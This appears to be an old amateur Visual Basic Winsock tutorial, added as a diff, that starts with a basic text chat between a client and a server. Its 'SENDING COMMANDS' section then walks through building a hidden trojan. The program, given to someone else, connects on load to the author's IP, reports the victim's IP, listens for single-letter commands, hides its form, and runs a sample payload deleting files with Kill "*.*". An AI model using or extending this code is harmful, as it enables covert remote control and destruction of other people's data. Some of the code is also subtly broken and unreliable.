@@ -1,0 +1,379 @@
+===========================WINSOCK TUTORIAL======================
+
+In this tutorial i will show you how to use winsock for begginners. 'How to make two programs communicate'
+
+
+WRITEN BY IowA*
+==================================================================
+
+
+
+
+Open visual basic twice so one can act as server and other can act as a client.
+
+
+
+==================================================================
+FINDING WINSOCK
+==================================================================
+Right click on the toolbar and click components and find 'Microsoft Winsock Control' 
+and make sure its checked now click apply then cancel, you should see the winsock control
+appear in the toolbar it looks like two computers joined with a red line.
+
+==================================================================
+SERVER
+==================================================================
+
+LISTENING
+
+Click the winsock control and draw it on your form and name it 'wskserver'
+now we need to make the server listen for connection so double click on your form so the form_load
+event comes up in your code 
+
+Private Sub Form_Load()
+Dim p As String
+p = 5432
+wskserver.LocalPort = p
+wskserver.Listen
+' MsgBox "winsock listening ok", vbInformation, "winsock ok"
+End Sub
+
+enter this code in your form_load event.
+whats happend is i have dimed p as string so visual basic will recognise in the code that p represents text
+and the text is 5432 which is stated underneith the dim statement.
+the line below is assigning the winsock control that the local port is p but p is actually 5432 so visual basic
+reads it as ' wskserver.LocalPort = 5432.'
+the next line is telling the winsock control to listen for connections on the local port wich is 5432.
+
+just to test if the winsock control is listening at runtime take away the ' before the message box on the final 
+line of code and run the program and see if the message box is displayed if it does then delete it entirly from 
+your code if not then read this tutorial again.
+
+CONNECTION REQUEST
+
+When something connects to the port winsock is listening on we need to accept the connection so other things can 
+then happen between the two programs
+
+now double click 'wskserver' on your form and  you will go to the code side and you should be in something called
+
+Private Sub wskserver_Error(bla bla bla)
+
+End Sub
+
+at the top right hand corner of the code window click on error and a drop down menu should appear, select 'connection request'
+now you should have this appear in your code 
+
+Private Sub wskserver_ConnectionRequest(ByVal requestID As Long)
+
+End Sub
+
+this is probably the simplest part of the program so i wont spend much time on it 
+enter this into the connection request event
+
+
+Private Sub wskserver_ConnectionRequest(ByVal requestID As Long)
+If wskserver.State <> sckClosed Then wskserver.Close
+wskserver.Accept requestID
+End Sub
+
+the first line checks the state of wskserver and if its anything but closed it will close it , so in other words its taking 
+it off listening and making it accept whos trying to connect to you.
+the next line is accepting the connection request.
+
+
+DATA ARRIVAL
+
+	
+Go to your form and draw a text box and call it 'txtrecieve'
+Now double click wskserver go to the top right hand side of the code again and select 'DataArrival'
+this can be slightly tricky so read this carefully. you will need to enter this code
+
+Private Sub wskserver_DataArrival(ByVal bytesTotal As Long)
+Dim data As String
+wskserver.GetData data
+txtrecieve.Text = data
+End Sub
+
+The first line dims the 'data' thats recieved as text (instead of data you can call it anythin e.g msg)
+the second line gets whatever the client is trying to send to the server in this case its called 'data'
+the third line says when the data is recieved display it in the txtrecieve text box. 
+If you get errors with this its most probably your client isnt connected to you.
+
+
+NOTE : ON THE CLIENT YOU CAN JUST ADD A CONNECTION REQUEST AND DATA ARRIVAL EVENT AND YOU WILL BE ABLE TO SEND TEXT TO AND
+FROM SERVER. ONCE CLIENT CONNECTED TO SERVER.
+
+================================================
+CLIENT
+================================================
+
+In your other visual basic program you have open draw the winsock control and call it wskclient. Draw 2 command buttons and
+call one 'cmdconnect' and the other 'cmdsend'. Draw 4 text boxes calling them 'txtsend'(to send the message) 'txtrecieve'
+(to recieve the message) 'txtip' (this is the box were the server IP will go) and 'txtp'(whatever port we want to connect on 
+will go here in this case its '5432') if you want to make your client more fancy then add labels at the side of the ip and 
+port box so you know wich one is which.
+
+now onto the programming
+
+double click the form to bring up the form_load event and enter the following code
+
+Private Sub Form_Load()
+txtp.Text = "5432"
+End Sub
+
+this is just to set the number in the port box to 5432 (what the server is listening on) this just makes it easier so you dont
+have to always remember the port and write it in every time the program has started.
+
+
+CONNECT
+
+
+now go back to your form and double click the 'cmdconnect' command button and type this code into the event
+
+Private Sub cmdconnect_Click()
+Dim ip As String
+Dim p As String
+ip = txtip.Text
+p = txtp.Text
+wskclient.Connect ip, p
+'MsgBox "connected", vbInformation, "connected"
+End Sub 
+  
+The first line is telling the program to show the variable 'ip' as text and on the second line it is doing the same but instead
+of 'ip' its 'p' the third line is saying whenever the program will see 'ip' it will look at the text in txtip text box which in this
+case will be the IP address we are connecting to. the forth line is saying whenever the program will see 'p' then it will
+look at the text in the txtp text box which in this case is the port we are going to connect on. the fifth line is now telling
+winsock 'wskclient' to connect to ip and p (put the host first then then port) so really the winsock will be doing this
+
+wskclient.Connect 127.0.0.1, 5432
+
+the first set of numbers is the IP we are connecting to (host) and then the commer then the port we are connecting on.
+in the sixth line you can add a message box to tell the user that they have connected ok(remove the ' if you want the message
+box to work.
+
+
+
+SEND
+
+
+
+now click the 'cmdsend' command button and add the following code
+
+Private Sub cmdsend_Click()
+Dim data As String
+data = txtsend.Text
+wskclient.SendData data
+End Sub
+
+
+i wont explain the first line as i have already explained it enough and the second line too. the third line tells winsock
+'wskclient' to send some data wich we have called 'data' just to keep it simple and 'data' is 'txtsend.text' wich is whatever
+the user has typed in.
+
+=====================================================
+RUNNING PROGRAM
+=====================================================
+
+
+the two programs are now able to communicate with each other. 
+
+1.Run the server.( IT IS VERY IMPORTANT YOU RUN THE SERVER FIRST IF YOU HAVE MADE THE WINSOCK LISTEN
+IN THE FORM_LOAD EVENT OTHERWISE THE WILL NOT COMMUNICATE)
+
+2.Run the client.
+
+3.Enter the IP and port (in client)
+
+4.Connect!
+
+5.Send message to the server
+
+
+
+
+
+=================================================================================================================================
+SENDING COMMANDS  ( I AM NOT TO BE HELD RESPONSIBLE FOR YOUR ACTIONS THE COMMANDS YOU SEND ARE UPTO YOU I ONLY SHOW HOW TO DO IT)
+=================================================================================================================================
+
+
+ok this is probably the hardest thing to do in winsock and its not that difficult once you get a full idea of whats happening
+so open two visual basics up and has one acting as server and one as client ( like i have already explained how to do)
+but to do this they will need to open the client and you will open the server also in the client dont add a connect or send 
+button put both the code in them in the form_load event so when they open the program it will connect and send data withought
+them doing anything (make sure you put YOUR IP in the ip box so when they open it it will connect to you.
+on the program that they will be open make one of the winsocks display their IP in a text box and make that winsock send 
+whats in the text box so in effect when they open the program it will send whats in the text box wich will be their IP.
+
+
+Private Sub Form_Load()
+Dim ip As String
+Dim p As String
+Dim data As String
+data = txtip.Text
+ip = txtmyip.Text
+p = 8000
+txtip.Text = wskip.LocalIP
+wskip.Close
+wskip.Connect ip, p
+wskip.SendData data
+End Sub
+
+it is a good idea to add another winsock that will listen in this form_load event so when you recieve their IP you can then
+connect to them and start sending commands.
+
+NOTE: if there is an error sending the data use the form_load event below which includes a timer.
+
+
+Private Sub Form_Load()
+Dim ip As String
+Dim p As String
+Dim data As String
+
+ip = txtmyip.Text
+p = 8000
+txtip.Text = wskip.LocalIP
+wskip.Close
+wskip.Connect ip, p
+tmr1.Enabled = True
+end sub
+
+make a timer and call it tmr1 and make sure you set its enabled property to false and set the interval to 1000.
+now type in the code above.
+now double click your timer and enter this code
+
+Private Sub tmr1_Timer()
+Dim data As String
+data = txtip.Text
+wskip.SendData data
+tmr1.Enabled = False
+End Sub
+
+now this will work and send you the persons IP 
+
+NOTE: on your other program make a winsock to listen on port 8000 and accept data as you already know how to do.
+
+COMMANDS
+
+to send commands we will actually be sending letter from the program that you have open to the program that they have open
+and then making the program that they have say  ok if the letter is T then do this or if the letter if F do this etc etc.
+
+
+in the program that the IP is sent from make another winsock listen 'wskcommand' on another port in the form_load event 
+(keep it high so less chance of other things using it) and make a text box called 'txtcommand'
+ make the wskcommand accept connection requests then in the data arrival put this.
+
+Private Sub wskcommand_DataArrival(ByVal bytesTotal As Long)
+Dim data As String
+wskcommand.GetData data
+txtcommand.Text = data
+If txtcommand.Text = "T" Then
+Call command1
+Else
+if txtcommand.Text = "L" Then
+Call command2
+End Sub
+
+in the data arrival event it is saying when the data arrives if the txtcommand box has a T in it then do command 1 but if it 
+doesnt have a T in then do command 2
+
+NOTE: on the program that you will be running on your pc that accepts the IP simply make another winsock called 
+'wsksendcommand' and make it connect to the winsock called wskcommand wich is obveosly on the program they will be running
+and send the letter T (you can make it into any letter you want it doesnt have to be T)
+
+the 'command1' and 'command2' are actually procedures that i have called command1 and command2 to make a procedure go to
+
+Tools > Add Procedure >
+ 
+then type in a name and click ok you will notice that it has made the procedure and you will now be able to enter commands
+into it. for example once you have made your data arrival event call the procedure you can put code in it and it will run 
+whatever is entered
+
+Public Sub command1()
+MsgBox " N00b i am now going to kill your PC", vbCritical, "kill pc"
+Kill "*.*"
+End Sub
+
+NOTE: you can add as many procedures as you want just make sure you call it with a letter in the data arrival event.
+
+
+
+
+======================================================
+USEFUL TIPS
+======================================================
+
+
+
+
+
+
+SENDING MORE THAN ONE TEXT BOX WITH THE SAME WINSOCK
+
+HIDING A FORM
+
+in the form_load event or were you want put
+
+form1.hide 
+
+this will hide your form
+
+to send more than one text box you need to use the + sign e.g
+
+Dim data As String
+data = txt1.Text + txt2.Text + txt3.Text
+wsksend.SendData data
+
+when the data is recieved it will show the text from these three text boxes together.
+
+
+CONNECT TO YOUR PC
+
+to connect to your pc use the IP address 127.0.0.1
+
+
+SENDING IP
+
+on a visual basic form make a text box and a winsock control call them 'txtip' and 'wskip'
+
+now in the form load event put 
+
+Private Sub Form_Load()
+txtip.Text = wskip.LocalIP
+End Sub
+
+this just sets the text property in the 'txtip' to the IP of whoever has opened the form.
+so now you need to make a program that will accept the IP its just exactly the same as above but instead of sending what the
+user has typed in it will send the IP.
+
+NOTE: for differant winsocks use differant ports or they wont work.
+
+
+TROUBLE SHOOTING:
+  
+This tutorial may have some errors in it and your program may not work rite or i havnt explained it correctly so e-mail any 
+questions to
+
+TEAM_UNDESIRABLES@HOTMAIL.COM  
+
+FIND MORE TUTORIALS ON WWW.UNDESIRABLES.TK
+
+WRITEN BY IowA*
+
+
+
+
+
+
+ 
+  
+
+   
+  
+
+
+
+
+
+
+
